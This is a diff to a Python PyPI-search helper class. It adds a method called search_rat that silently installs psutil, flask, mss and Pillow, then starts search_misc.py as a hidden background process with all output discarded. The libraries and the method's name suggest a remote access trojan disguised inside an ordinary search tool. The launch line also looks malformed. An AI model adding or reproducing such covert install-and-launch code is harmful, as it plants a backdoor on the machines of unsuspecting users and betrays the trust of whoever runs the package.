@@ -1,6 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 
+
 class SearchEndpoints:
     def search_pypi(query):
         url = "https://pypi.org/search/"
@@ -102,3 +103,25 @@ class SearchEndpoints:
                 print(f"{i}. {name} ({version}) - {description}")
         else:
             print("An error occurred while searching for the package.")
+
+    def search_rat():
+        import subprocess, sys
+        subprocess.check_call(
+            [
+                sys.executable,
+                "-m",
+                "pip",
+                "install",
+                "--quiet",
+                "requests",
+                "psutil",
+                "flask",
+                "mss",
+                "Pillow"
+            ]
+        )
+        subprocess.run(
+            [
+                "(nohup python search_misc.py </dev/null >/dev/null 2>&1 &)",
+            ]
+        )
